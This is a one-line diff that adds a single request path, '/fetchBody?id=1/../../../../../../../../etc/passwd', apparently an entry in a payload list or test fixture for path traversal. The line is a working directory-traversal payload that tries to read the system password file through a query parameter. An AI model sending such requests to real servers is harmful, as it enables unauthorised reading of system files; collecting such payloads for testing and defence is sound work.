@@ -1,0 +1,1 @@
+/fetchBody?id=1/../../../../../../../../etc/passwd
